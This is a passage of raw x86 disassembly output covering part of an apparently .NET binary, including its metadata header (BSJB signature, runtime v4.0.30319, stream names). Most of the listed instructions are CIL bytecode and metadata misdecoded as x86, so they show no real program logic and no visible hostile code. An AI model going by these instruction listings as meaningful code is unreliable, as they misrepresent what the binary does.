  404d48:	11 06                	adc    %eax,(%esi)
  404d4a:	17                   	pop    %ss
  404d4b:	16                   	push   %ss
  404d4c:	9c                   	pushf
  404d4d:	11 06                	adc    %eax,(%esi)
  404d4f:	18 16                	sbb    %dl,(%esi)
  404d51:	9c                   	pushf
  404d52:	11 06                	adc    %eax,(%esi)
  404d54:	17                   	pop    %ss
  404d55:	28 72 00             	sub    %dh,0x0(%edx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	26 11 06             	adc    %eax,%es:(%esi)
  404d5d:	16                   	push   %ss
  404d5e:	90                   	nop
  404d5f:	2c 1f                	sub    $0x1f,%al
  404d61:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404d64:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404d6b:	09 00                	or     %eax,(%eax)
  404d6d:	00 1b                	add    %bl,(%ebx)
  404d6f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404d72:	00 0a                	add    %cl,(%edx)
  404d74:	28 03                	sub    %al,(%ebx)
  404d76:	01 00                	add    %eax,(%eax)
  404d78:	0a 74 09 00          	or     0x0(%ecx,%ecx,1),%dh
  404d7c:	00 1b                	add    %bl,(%ebx)
  404d7e:	10 00                	adc    %al,(%eax)
  404d80:	09 14 72             	or     %edx,(%edx,%esi,2)
  404d83:	9d                   	popf
  404d84:	0c 00                	or     $0x0,%al
  404d86:	70 16                	jo     0x404d9e
  404d88:	8d 03                	lea    (%ebx),%eax
  404d8a:	00 00                	add    %al,(%eax)
  404d8c:	01 14 14             	add    %edx,(%esp,%edx,1)
  404d8f:	14 17                	adc    $0x17,%al
  404d91:	28 72 00             	sub    %dh,0x0(%edx)
  404d94:	00 0a                	add    %cl,(%edx)
  404d96:	26 de 0f             	fimuls %es:(%edi)
  404d99:	09 2c 0b             	or     %ebp,(%ebx,%ecx,1)
  404d9c:	09 74 45 00          	or     %esi,0x0(%ebp,%eax,2)
  404da0:	00 01                	add    %al,(%ecx)
  404da2:	6f                   	outsl  %ds:(%esi),(%dx)
  404da3:	58                   	pop    %eax
  404da4:	00 00                	add    %al,(%eax)
  404da6:	0a dc                	or     %ah,%bl
  404da8:	07                   	pop    %es
  404da9:	14 72                	adc    $0x72,%al
  404dab:	a9 0c 00 70 16       	test   $0x1670000c,%eax
  404db0:	8d 03                	lea    (%ebx),%eax
  404db2:	00 00                	add    %al,(%eax)
  404db4:	01 14 14             	add    %edx,(%esp,%edx,1)
  404db7:	14 28                	adc    $0x28,%al
  404db9:	ad                   	lods   %ds:(%esi),%eax
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	0a 74 09 00          	or     0x0(%ecx,%ecx,1),%dh
  404dc0:	00 1b                	add    %bl,(%ebx)
  404dc2:	0a de                	or     %dh,%bl
  404dc4:	11 de                	adc    %ebx,%esi
  404dc6:	0f 07                	sysret
  404dc8:	2c 0b                	sub    $0xb,%al
  404dca:	07                   	pop    %es
  404dcb:	74 45                	je     0x404e12
  404dcd:	00 00                	add    %al,(%eax)
  404dcf:	01 6f 58             	add    %ebp,0x58(%edi)
  404dd2:	00 00                	add    %al,(%eax)
  404dd4:	0a dc                	or     %ah,%bl
  404dd6:	06                   	push   %es
  404dd7:	2a 41 34             	sub    0x34(%ecx),%al
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 00                	add    (%eax),%al
  404dde:	00 00                	add    %al,(%eax)
  404de0:	81 00 00 00 90 00    	addl   $0x900000,(%eax)
  404de6:	00 00                	add    %al,(%eax)
  404de8:	11 01                	adc    %eax,(%ecx)
  404dea:	00 00                	add    %al,(%eax)
  404dec:	0f 00 00             	sldt   (%eax)
  404def:	00 00                	add    %al,(%eax)
  404df1:	00 00                	add    %al,(%eax)
  404df3:	00 02                	add    %al,(%edx)
  404df5:	00 00                	add    %al,(%eax)
  404df7:	00 06                	add    %al,(%esi)
  404df9:	00 00                	add    %al,(%eax)
  404dfb:	00 39                	add    %bh,(%ecx)
  404dfd:	01 00                	add    %eax,(%eax)
  404dff:	00 3f                	add    %bh,(%edi)
  404e01:	01 00                	add    %eax,(%eax)
  404e03:	00 0f                	add    %cl,(%edi)
  404e05:	00 00                	add    %al,(%eax)
  404e07:	00 00                	add    %al,(%eax)
  404e09:	00 00                	add    %al,(%eax)
  404e0b:	00 1b                	add    %bl,(%ebx)
  404e0d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404e10:	55                   	push   %ebp
  404e11:	00 00                	add    %al,(%eax)
  404e13:	00 39                	add    %bh,(%ecx)
  404e15:	00 00                	add    %al,(%eax)
  404e17:	11 73 e1             	adc    %esi,-0x1f(%ebx)
  404e1a:	00 00                	add    %al,(%eax)
  404e1c:	0a 0a                	or     (%edx),%cl
  404e1e:	73 e2                	jae    0x404e02
  404e20:	00 00                	add    %al,(%eax)
  404e22:	0a 0c 06             	or     (%esi,%eax,1),%cl
  404e25:	08 7e 09             	or     %bh,0x9(%esi)
  404e28:	00 00                	add    %al,(%eax)
  404e2a:	04 28                	add    $0x28,%al
  404e2c:	4b                   	dec    %ebx
  404e2d:	00 00                	add    %al,(%eax)
  404e2f:	06                   	push   %es
  404e30:	6f                   	outsl  %ds:(%esi),(%dx)
  404e31:	e3 00                	jecxz  0x404e33
  404e33:	00 0a                	add    %cl,(%edx)
  404e35:	6f                   	outsl  %ds:(%esi),(%dx)
  404e36:	e5 00                	in     $0x0,%eax
  404e38:	00 0a                	add    %cl,(%edx)
  404e3a:	06                   	push   %es
  404e3b:	18 6f e6             	sbb    %ch,-0x1a(%edi)
  404e3e:	00 00                	add    %al,(%eax)
  404e40:	0a 06                	or     (%esi),%al
  404e42:	6f                   	outsl  %ds:(%esi),(%dx)
  404e43:	09 01                	or     %eax,(%ecx)
  404e45:	00 0a                	add    %cl,(%edx)
  404e47:	13 04 02             	adc    (%edx,%eax,1),%eax
  404e4a:	0d 11 04 09 16       	or     $0x16090411,%eax
  404e4f:	09 8e b7 6f e8 00    	or     %ecx,0xe86fb7(%esi)
  404e55:	00 0a                	add    %cl,(%edx)
  404e57:	0b de                	or     %esi,%ebx
  404e59:	11 de                	adc    %ebx,%esi
  404e5b:	0f 25                	(bad)
  404e5d:	28 22                	sub    %ah,(%edx)
  404e5f:	00 00                	add    %al,(%eax)
  404e61:	0a 13                	or     (%ebx),%dl
  404e63:	05 28 24 00 00       	add    $0x2428,%eax
  404e68:	0a de                	or     %dh,%bl
  404e6a:	00 07                	add    %al,(%edi)
  404e6c:	2a 00                	sub    (%eax),%al
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	01 10                	add    %edx,(%eax)
  404e72:	00 00                	add    %al,(%eax)
  404e74:	00 00                	add    %al,(%eax)
  404e76:	0c 00                	or     $0x0,%al
  404e78:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  404e7c:	25 00 00 01 1b       	and    $0x1b010000,%eax
  404e81:	30 04 00             	xor    %al,(%eax,%eax,1)
  404e84:	55                   	push   %ebp
  404e85:	00 00                	add    %al,(%eax)
  404e87:	00 3a                	add    %bh,(%edx)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	11 73 e1             	adc    %esi,-0x1f(%ebx)
  404e8e:	00 00                	add    %al,(%eax)
  404e90:	0a 0a                	or     (%edx),%cl
  404e92:	73 e2                	jae    0x404e76
  404e94:	00 00                	add    %al,(%eax)
  404e96:	0a 0c 06             	or     (%esi,%eax,1),%cl
  404e99:	08 7e 09             	or     %bh,0x9(%esi)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	04 28                	add    $0x28,%al
  404ea0:	4b                   	dec    %ebx
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	06                   	push   %es
  404ea4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ea5:	e3 00                	jecxz  0x404ea7
  404ea7:	00 0a                	add    %cl,(%edx)
  404ea9:	6f                   	outsl  %ds:(%esi),(%dx)
  404eaa:	e5 00                	in     $0x0,%eax
  404eac:	00 0a                	add    %cl,(%edx)
  404eae:	06                   	push   %es
  404eaf:	18 6f e6             	sbb    %ch,-0x1a(%edi)
  404eb2:	00 00                	add    %al,(%eax)
  404eb4:	0a 06                	or     (%esi),%al
  404eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb7:	e7 00                	out    %eax,$0x0
  404eb9:	00 0a                	add    %cl,(%edx)
  404ebb:	13 04 02             	adc    (%edx,%eax,1),%eax
  404ebe:	0d 11 04 09 16       	or     $0x16090411,%eax
  404ec3:	09 8e b7 6f e8 00    	or     %ecx,0xe86fb7(%esi)
  404ec9:	00 0a                	add    %cl,(%edx)
  404ecb:	0b de                	or     %esi,%ebx
  404ecd:	11 de                	adc    %ebx,%esi
  404ecf:	0f 25                	(bad)
  404ed1:	28 22                	sub    %ah,(%edx)
  404ed3:	00 00                	add    %al,(%eax)
  404ed5:	0a 13                	or     (%ebx),%dl
  404ed7:	05 28 24 00 00       	add    $0x2428,%eax
  404edc:	0a de                	or     %dh,%bl
  404ede:	00 07                	add    %al,(%edi)
  404ee0:	2a 00                	sub    (%eax),%al
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	01 10                	add    %edx,(%eax)
  404ee6:	00 00                	add    %al,(%eax)
  404ee8:	00 00                	add    %al,(%eax)
  404eea:	0c 00                	or     $0x0,%al
  404eec:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  404ef0:	25 00 00 01 13       	and    $0x13010000,%eax
  404ef5:	30 03                	xor    %al,(%ebx)
  404ef7:	00 18                	add    %bl,(%eax)
  404ef9:	00 00                	add    %al,(%eax)
  404efb:	00 3b                	add    %bh,(%ebx)
  404efd:	00 00                	add    %al,(%eax)
  404eff:	11 16                	adc    %edx,(%esi)
  404f01:	7e 0e                	jle    0x404f11
  404f03:	00 00                	add    %al,(%eax)
  404f05:	04 12                	add    $0x12,%al
  404f07:	00 73 0a             	add    %dh,0xa(%ebx)
  404f0a:	01 00                	add    %eax,(%eax)
  404f0c:	0a 80 2a 00 00 04    	or     0x400002a(%eax),%al
  404f12:	06                   	push   %es
  404f13:	0b 2b                	or     (%ebx),%ebp
  404f15:	00 07                	add    %al,(%edi)
  404f17:	2a 62 7e             	sub    0x7e(%edx),%ah
  404f1a:	2a 00                	sub    (%eax),%al
  404f1c:	00 04 2c             	add    %al,(%esp,%ebp,1)
  404f1f:	10 7e 2a             	adc    %bh,0x2a(%esi)
  404f22:	00 00                	add    %al,(%eax)
  404f24:	04 6f                	add    $0x6f,%al
  404f26:	0b 01                	or     (%ecx),%eax
  404f28:	00 0a                	add    %cl,(%edx)
  404f2a:	14 80                	adc    $0x80,%al
  404f2c:	2a 00                	sub    (%eax),%al
  404f2e:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404f31:	00 00                	add    %al,(%eax)
  404f33:	00 42 53             	add    %al,0x53(%edx)
  404f36:	4a                   	dec    %edx
  404f37:	42                   	inc    %edx
  404f38:	01 00                	add    %eax,(%eax)
  404f3a:	01 00                	add    %eax,(%eax)
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	00 00                	add    %al,(%eax)
  404f40:	0c 00                	or     $0x0,%al
  404f42:	00 00                	add    %al,(%eax)
  404f44:	76 34                	jbe    0x404f7a
  404f46:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404f49:	33 30                	xor    (%eax),%esi
  404f4b:	33 31                	xor    (%ecx),%esi
  404f4d:	39 00                	cmp    %eax,(%eax)
  404f4f:	00 00                	add    %al,(%eax)
  404f51:	00 05 00 6c 00 00    	add    %al,0x6c00
  404f57:	00 10                	add    %dl,(%eax)
  404f59:	17                   	pop    %ss
  404f5a:	00 00                	add    %al,(%eax)
  404f5c:	23 7e 00             	and    0x0(%esi),%edi
  404f5f:	00 7c 17 00          	add    %bh,0x0(%edi,%edx,1)
  404f63:	00 84 1a 00 00 23 53 	add    %al,0x53230000(%edx,%ebx,1)
  404f6a:	74 72                	je     0x404fde
  404f6c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  404f73:	00 00                	add    %al,(%eax)
  404f75:	32 00                	xor    (%eax),%al
  404f77:	00 bc 0c 00 00 23 55 	add    %bh,0x55230000(%esp,%ecx,1)
  404f7e:	53                   	push   %ebx
  404f7f:	00 bc 3e 00 00 10 00 	add    %bh,0x100000(%esi,%edi,1)
  404f86:	00 00                	add    %al,(%eax)
  404f88:	23 47 55             	and    0x55(%edi),%eax
  404f8b:	49                   	dec    %ecx
  404f8c:	44                   	inc    %esp
  404f8d:	00 00                	add    %al,(%eax)
  404f8f:	00 cc                	add    %cl,%ah
  404f91:	3e 00 00             	add    %al,%ds:(%eax)
  404f94:	70 09                	jo     0x404f9f
  404f96:	00 00                	add    %al,(%eax)
  404f98:	23 42 6c             	and    0x6c(%edx),%eax
  404f9b:	6f                   	outsl  %ds:(%esi),(%dx)
  404f9c:	62 00                	bound  %eax,(%eax)
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	00 00                	add    %al,(%eax)
  404fa2:	00 00                	add    %al,(%eax)
  404fa4:	02 00                	add    (%eax),%al
  404fa6:	00 01                	add    %al,(%ecx)
  404fa8:	57                   	push   %edi
  404fa9:	3d a2 1d 09 0e       	cmp    $0xe091da2,%eax
  404fae:	00 00                	add    %al,(%eax)
  404fb0:	00 fa                	add    %bh,%dl
  404fb2:	25 33 00 16 00       	and    $0x160033,%eax
  404fb7:	00 01                	add    %al,(%ecx)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	00 a3 00 00 00 11    	add    %ah,0x11000000(%ebx)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	00 32                	add    %dh,(%edx)
  404fc5:	00 00                	add    %al,(%eax)
  404fc7:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  404fcb:	00 40 00             	add    %al,0x0(%eax)
  404fce:	00 00                	add    %al,(%eax)
  404fd0:	16                   	push   %ss
  404fd1:	01 00                	add    %eax,(%eax)
  404fd3:	00 04 00             	add    %al,(%eax,%eax,1)
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	41                   	inc    %ecx
  404fd9:	00 00                	add    %al,(%eax)
  404fdb:	00 04 00             	add    %al,(%eax,%eax,1)
  404fde:	00 00                	add    %al,(%eax)
  404fe0:	3b 00                	cmp    (%eax),%eax
  404fe2:	00 00                	add    %al,(%eax)
  404fe4:	02 00                	add    (%eax),%al
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	05 00 00 00 05       	add    $0x5000000,%eax
  404fed:	00 00                	add    %al,(%eax)
  404fef:	00 04 00             	add    %al,(%eax,%eax,1)
  404ff2:	00 00                	add    %al,(%eax)
  404ff4:	0b 00                	or     (%eax),%eax
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	07                   	pop    %es
  404ff9:	00 00                	add    %al,(%eax)
  404ffb:	00 01                	add    %al,(%ecx)
  404ffd:	00 00                	add    %al,(%eax)
  404fff:	00 07                	add    %al,(%edi)
  405001:	00 00                	add    %al,(%eax)
  405003:	00 05 00 00 00 03    	add    %al,0x3000000
  405009:	00 00                	add    %al,(%eax)
  40500b:	00 04 00             	add    %al,(%eax,%eax,1)
  40500e:	00 00                	add    %al,(%eax)
  405010:	00 00                	add    %al,(%eax)
  405012:	7a 1a                	jp     0x40502e
  405014:	01 00                	add    %eax,(%eax)
  405016:	00 00                	add    %al,(%eax)
  405018:	00 00                	add    %al,(%eax)
  40501a:	0a 00                	or     (%eax),%al
  40501c:	09 01                	or     %eax,(%ecx)
  40501e:	df 00                	filds  (%eax)
  405020:	0a 00                	or     (%eax),%al
  405022:	3d 01 1f 01 06       	cmp    $0x6011f01,%eax
  405027:	00 4d 01             	add    %cl,0x1(%ebp)
  40502a:	46                   	inc    %esi
  40502b:	01 0a                	add    %ecx,(%edx)
  40502d:	00 a5 01 df 00 06    	add    %ah,0x600df01(%ebp)
  405033:	00 23                	add    %ah,(%ebx)
  405035:	02 46 01             	add    0x1(%esi),%al
  405038:	0e                   	push   %cs
  405039:	00 ea                	add    %ch,%dl
  40503b:	02 d7                	add    %bh,%dl
  40503d:	02 06                	add    (%esi),%al
  40503f:	00 11                	add    %dl,(%ecx)
  405041:	03 07                	add    (%edi),%eax
  405043:	03 06                	add    (%esi),%eax
  405045:	00 32                	add    %dh,(%edx)
  405047:	03 21                	add    (%ecx),%esp
  405049:	03 06                	add    (%esi),%eax
  40504b:	00 3d 03 21 03 06    	add    %bh,0x6032103
  405051:	00 c5                	add    %al,%ch
  405053:	03 46 01             	add    0x1(%esi),%eax
  405056:	06                   	push   %es
  405057:	00 44 04 21          	add    %al,0x21(%esp,%eax,1)
  40505b:	03 06                	add    (%esi),%eax
  40505d:	00 af 05 46 01 06    	add    %ch,0x6014605(%edi)
  405063:	00 15 06 46 01 06    	add    %dl,0x6014606
  405069:	00 75 06             	add    %dh,0x6(%ebp)
  40506c:	69 06 06 00 c5 02    	imul   $0x2c50006,(%esi),%eax
  405072:	21 03                	and    %eax,(%ebx)
  405074:	06                   	push   %es
  405075:	00 6a 07             	add    %ch,0x7(%edx)
  405078:	46                   	inc    %esi
  405079:	01 06                	add    %eax,(%esi)
  40507b:	00 82 07 46 01 0e    	add    %al,0xe014607(%edx)
  405081:	00 da                	add    %bl,%dl
  405083:	07                   	pop    %es
  405084:	c4 07                	les    (%edi),%eax
  405086:	0e                   	push   %cs
  405087:	00 f3                	add    %dh,%bl
  405089:	07                   	pop    %es
  40508a:	c4 07                	les    (%edi),%eax
  40508c:	0e                   	push   %cs
  40508d:	00 20                	add    %ah,(%eax)
  40508f:	08 08                	or     %cl,(%eax)
  405091:	08 06                	or     %al,(%esi)
  405093:	00 4a 08             	add    %cl,0x8(%edx)
  405096:	37                   	aaa
  405097:	08 0a                	or     %cl,(%edx)
  405099:	00 89 08 62 08 0a    	add    %cl,0xa086208(%ecx)
  40509f:	00 a1 08 13 00 0e    	add    %ah,0xe001308(%ecx)
  4050a5:	00 d6                	add    %dl,%dh
  4050a7:	08 b9 08 06 00 0b    	or     %bh,0xb000608(%ecx)
  4050ad:	09 eb                	or     %ebp,%ebx
  4050af:	08 06                	or     %al,(%esi)
  4050b1:	00 29                	add    %ch,(%ecx)
  4050b3:	09 46 01             	or     %eax,0x1(%esi)
  4050b6:	06                   	push   %es
  4050b7:	00 4d 09             	add    %cl,0x9(%ebp)
  4050ba:	46                   	inc    %esi
  4050bb:	01 0a                	add    %ecx,(%edx)
  4050bd:	00 66 09             	add    %ah,0x9(%esi)
  4050c0:	13 00                	adc    (%eax),%eax
  4050c2:	06                   	push   %es
  4050c3:	00 a0 09 81 09 06    	add    %ah,0x6098109(%eax)
  4050c9:	00 b4 09 46 01 06 00 	add    %dh,0x60146(%ecx,%ecx,1)
  4050d0:	ca 09 eb             	lret   $0xeb09
  4050d3:	08 0a                	or     %cl,(%edx)
  4050d5:	00 e5                	add    %ah,%ch
  4050d7:	09 62 08             	or     %esp,0x8(%edx)
  4050da:	06                   	push   %es
  4050db:	00 12                	add    %dl,(%edx)
  4050dd:	0a 46 01             	or     0x1(%esi),%al
  4050e0:	06                   	push   %es
  4050e1:	00 3e                	add    %bh,(%esi)
  4050e3:	0a 46 01             	or     0x1(%esi),%al
  4050e6:	06                   	push   %es
  4050e7:	00 b9 0a 37 08 06    	add    %bh,0x608370a(%ecx)
  4050ed:	00 d2                	add    %dl,%dl
  4050ef:	0a 37                	or     (%edi),%dh
  4050f1:	08 06                	or     %al,(%esi)
  4050f3:	00 ef                	add    %ch,%bh
  4050f5:	0a 46 01             	or     0x1(%esi),%al
  4050f8:	0a 00                	or     (%eax),%al
  4050fa:	f9                   	stc
  4050fb:	0a 62 08             	or     0x8(%edx),%ah
  4050fe:	06                   	push   %es
  4050ff:	00 15 0b 46 01 06    	add    %dl,0x601460b
  405105:	00 38                	add    %bh,(%eax)
  405107:	0b 21                	or     (%ecx),%esp
  405109:	03 06                	add    (%esi),%eax
  40510b:	00 54 0b 21          	add    %dl,0x21(%ebx,%ecx,1)
  40510f:	03 06                	add    (%esi),%eax
  405111:	00 67 0b             	add    %ah,0xb(%edi)
  405114:	46                   	inc    %esi
  405115:	01 0e                	add    %ecx,(%esi)
  405117:	00 a0 0b 95 0b 06    	add    %ah,0x60b950b(%eax)
  40511d:	00 aa 0b 46 01 06    	add    %ch,0x601460b(%edx)
  405123:	00 af 0b 46 01 0e    	add    %ch,0xe01460b(%edi)
  405129:	00 bc 0b 95 0b 06 00 	add    %bh,0x60b95(%ebx,%ecx,1)
  405130:	d1 0b                	rorl   $1,(%ebx)
  405132:	21 03                	and    %eax,(%ebx)
  405134:	0e                   	push   %cs
  405135:	00 df                	add    %bl,%bh
  405137:	0b d7                	or     %edi,%edx
  405139:	02 0e                	add    (%esi),%cl
  40513b:	00 ed                	add    %ch,%ch
  40513d:	0b d7                	or     %edi,%edx
  40513f:	02 0e                	add    (%esi),%cl
  405141:	00 f8                	add    %bh,%al
  405143:	0b d7                	or     %edi,%edx
  405145:	02 06                	add    (%esi),%al
  405147:	00 05 0c 46 01 0e    	add    %al,0xe01460c
  40514d:	00 3b                	add    %bh,(%ebx)
  40514f:	0c d7                	or     $0xd7,%al
  405151:	02 06                	add    (%esi),%al
  405153:	00 47 0c             	add    %al,0xc(%edi)
  405156:	21 03                	and    %eax,(%ebx)
  405158:	0a 00                	or     (%eax),%al
  40515a:	5b                   	pop    %ebx
  40515b:	0c 1f                	or     $0x1f,%al
  40515d:	01 06                	add    %eax,(%esi)
  40515f:	00 8c 0c 46 01 06 00 	add    %cl,0x60146(%esp,%ecx,1)
  405166:	dc 0c 46             	fmull  (%esi,%eax,2)
  405169:	01 06                	add    %eax,(%esi)
  40516b:	00 e4                	add    %ah,%ah
  40516d:	0c 07                	or     $0x7,%al
  40516f:	03 06                	add    (%esi),%eax
  405171:	00 ed                	add    %ch,%ch
  405173:	0c 46                	or     $0x46,%al
  405175:	01 06                	add    %eax,(%esi)
  405177:	00 f6                	add    %dh,%dh
  405179:	0c 07                	or     $0x7,%al
  40517b:	03 06                	add    (%esi),%eax
  40517d:	00 17                	add    %dl,(%edi)
  40517f:	0d 07 03 0a 00       	or     $0xa0307,%eax
  405184:	28 0d 62 08 06 00    	sub    %cl,0x60862
  40518a:	5a                   	pop    %edx
  40518b:	0d 40 0d 06 00       	or     $0x60d40,%eax
  405190:	75 0d                	jne    0x40519f
  405192:	40                   	inc    %eax
  405193:	0d 06 00 86 0d       	or     $0xd860006,%eax
  405198:	40                   	inc    %eax
  405199:	0d 12 00 b4 0d       	or     $0xdb40012,%eax
  40519e:	a2 0d 12 00 cd       	mov    %al,0xcd00120d
  4051a3:	0d a2 0d 12 00       	or     $0x120da2,%eax
  4051a8:	e2 0d                	loop   0x4051b7
  4051aa:	a2 0d 0f 01 fd       	mov    %al,0xfd010f0d
  4051af:	0d 00 00 06 00       	or     $0x60000,%eax
  4051b4:	5f                   	pop    %edi
  4051b5:	0e                   	push   %cs
  4051b6:	46                   	inc    %esi
  4051b7:	01 12                	add    %edx,(%edx)
  4051b9:	00 88 0e a2 0d 12    	add    %cl,0x120da20e(%eax)
  4051bf:	00 94 0e a2 0d 0a 00 	add    %dl,0xa0da2(%esi,%ecx,1)
  4051c6:	bd 0e 1f 01 06       	mov    $0x6011f0e,%ebp
  4051cb:	00 ed                	add    %ch,%ch
  4051cd:	0e                   	push   %cs
  4051ce:	46                   	inc    %esi
  4051cf:	01 0a                	add    %ecx,(%edx)
  4051d1:	00 f4                	add    %dh,%ah
  4051d3:	0e                   	push   %cs
  4051d4:	13 00                	adc    (%eax),%eax
  4051d6:	06                   	push   %es
  4051d7:	00 03                	add    %al,(%ebx)
  4051d9:	0f 46 01             	cmovbe (%ecx),%eax
  4051dc:	06                   	push   %es
  4051dd:	00 0e                	add    %cl,(%esi)
  4051df:	0f 46 01             	cmovbe (%ecx),%eax
  4051e2:	06                   	push   %es
  4051e3:	00 36                	add    %dh,(%esi)
  4051e5:	0f 07                	sysret
  4051e7:	03 06                	add    (%esi),%eax
  4051e9:	00 4d 0f             	add    %cl,0xf(%ebp)
  4051ec:	21 03                	and    %eax,(%ebx)
  4051ee:	0a 00                	or     (%eax),%al
  4051f0:	66 0f 62 08          	punpckldq (%eax),%xmm1
  4051f4:	0a 00                	or     (%eax),%al
  4051f6:	7e 0f                	jle    0x405207
  4051f8:	62 08                	bound  %ecx,(%eax)
  4051fa:	06                   	push   %es
  4051fb:	00 ac 0f 21 03 0e 00 	add    %ch,0xe0321(%edi,%ecx,1)
  405202:	ba 0f d7 02 06       	mov    $0x602d70f,%edx
  405207:	00 da                	add    %bl,%dl
  405209:	0f 46 01             	cmovbe (%ecx),%eax
  40520c:	0e                   	push   %cs
  40520d:	00 34 10             	add    %dh,(%eax,%edx,1)
  405210:	95                   	xchg   %eax,%ebp
  405211:	0b 16                	or     (%esi),%edx
  405213:	00 4d 10             	add    %cl,0x10(%ebp)
  405216:	3e 10 16             	adc    %dl,%ds:(%esi)
  405219:	00 56 10             	add    %dl,0x10(%esi)
  40521c:	3e 10 16             	adc    %dl,%ds:(%esi)
  40521f:	00 5b 10             	add    %bl,0x10(%ebx)
  405222:	3e 10 16             	adc    %dl,%ds:(%esi)
  405225:	00 65 10             	add    %ah,0x10(%ebp)
  405228:	3e 10 0a             	adc    %cl,%ds:(%edx)
  40522b:	00 6c 10 13          	add    %ch,0x13(%eax,%edx,1)
  40522f:	00 0a                	add    %cl,(%edx)
  405231:	00 74 10 13          	add    %dh,0x13(%eax,%edx,1)
  405235:	00 1a                	add    %bl,(%edx)
  405237:	00 f6                	add    %dh,%dh
  405239:	01 82 10 0e 00 9f    	add    %eax,-0x60fff1f0(%edx)
  40523f:	10 d7                	adc    %dl,%bh
  405241:	02 06                	add    (%esi),%al
  405243:	00 b7 10 46 01 0e    	add    %dh,0xe014610(%edi)
  405249:	00 d0                	add    %dl,%al
  40524b:	10 95 0b 0e 00 fa    	adc    %dl,-0x5fff1f5(%ebp)
  405251:	10 95 0b 0e 00 60    	adc    %dl,0x60000e0b(%ebp)
  405257:	11 37                	adc    %esi,(%edi)
  405259:	08 0a                	or     %cl,(%edx)
  40525b:	00 68 11             	add    %ch,0x11(%eax)
  40525e:	13 00                	adc    (%eax),%eax
  405260:	0a 00                	or     (%eax),%al
  405262:	74 11                	je     0x405275
  405264:	13 00                	adc    (%eax),%eax
  405266:	9f                   	lahf
  405267:	00 8c 11 00 00 06 00 	add    %cl,0x60000(%ecx,%edx,1)
  40526e:	a8 11                	test   $0x11,%al
  405270:	07                   	pop    %es
  405271:	03 0a                	add    (%edx),%ecx
  405273:	00 f3                	add    %dh,%bl
  405275:	11 d2                	adc    %edx,%edx
  405277:	11 06                	adc    %eax,(%esi)
  405279:	00 1e                	add    %bl,(%esi)
  40527b:	12 0e                	adc    (%esi),%cl
  40527d:	12 1a                	adc    (%edx),%bl
  40527f:	00 47 12             	add    %al,0x12(%edi)
  405282:	82 10 16             	adcb   $0x16,(%eax)
  405285:	00 97 12 80 12 16    	add    %dl,0x16128012(%edi)
  40528b:	00 a3 12 3e 10 16    	add    %ah,0x16103e12(%ebx)
  405291:	00 b3 12 3e 10 16    	add    %dh,0x16103e12(%ebx)
  405297:	00 d5                	add    %dl,%ch
  405299:	12 3e                	adc    (%esi),%bh
  40529b:	10 16                	adc    %dl,(%esi)
  40529d:	00 ec                	add    %ch,%ah
  40529f:	12 80 12 06 00 27    	adc    0x27000612(%eax),%al
  4052a5:	13 15 13 06 00 32    	adc    0x32000613,%edx
  4052ab:	13 46 01             	adc    0x1(%esi),%eax
  4052ae:	06                   	push   %es
  4052af:	00 4e 13             	add    %cl,0x13(%esi)
  4052b2:	15 13 06 00 65       	adc    $0x65000613,%eax
  4052b7:	13 15 13 06 00 b2    	adc    0xb2000613,%edx
  4052bd:	13 46 01             	adc    0x1(%esi),%eax
  4052c0:	0e                   	push   %cs
  4052c1:	00 d4                	add    %dl,%ah
  4052c3:	13 37                	adc    (%edi),%esi
  4052c5:	08 06                	or     %al,(%esi)
  4052c7:	00 20                	add    %ah,(%eax)
  4052c9:	14 05                	adc    $0x5,%al
  4052cb:	14 06                	adc    $0x6,%al
  4052cd:	00 6b 14             	add    %ch,0x14(%ebx)
  4052d0:	46                   	inc    %esi
  4052d1:	01 1e                	add    %ebx,(%esi)
  4052d3:	00 8a 14 7e 14 06    	add    %cl,0x6147e14(%edx)
  4052d9:	00 95 14 05 14 0e    	add    %dl,0xe140514(%ebp)
  4052df:	00 a7 14 95 0b 0e    	add    %ah,0xe0b9514(%edi)
  4052e5:	00 b6 14 95 0b 0e    	add    %dh,0xe0b9514(%esi)
  4052eb:	00 c6                	add    %al,%dh
  4052ed:	14 95                	adc    $0x95,%al
  4052ef:	0b 0e                	or     (%esi),%ecx
  4052f1:	00 13                	add    %dl,(%ebx)
  4052f3:	15 95 0b 0e 00       	adc    $0xe0b95,%eax
  4052f8:	31 15 37 08 0e 00    	xor    %edx,0xe0837
  4052fe:	59                   	pop    %ecx
  4052ff:	15 37 08 06 00       	adc    $0x60837,%eax
  405304:	99                   	cltd
  405305:	15 15 13 06 00       	adc    $0x61315,%eax
  40530a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40530b:	15 15 13 06 00       	adc    $0x61315,%eax
  405310:	c0 15 69 06 06 00 db 	rclb   $0xdb,0x60669
  405317:	15 81 09 06 00       	adc    $0x60981,%eax
  40531c:	fb                   	sti
  40531d:	15 81 09 06 00       	adc    $0x60981,%eax
  405322:	0e                   	push   %cs
  405323:	16                   	push   %ss
  405324:	81 09 06 00 1c 16    	orl    $0x161c0006,(%ecx)
  40532a:	07                   	pop    %es
  40532b:	03 06                	add    (%esi),%eax
  40532d:	00 39                	add    %bh,(%ecx)
  40532f:	16                   	push   %ss
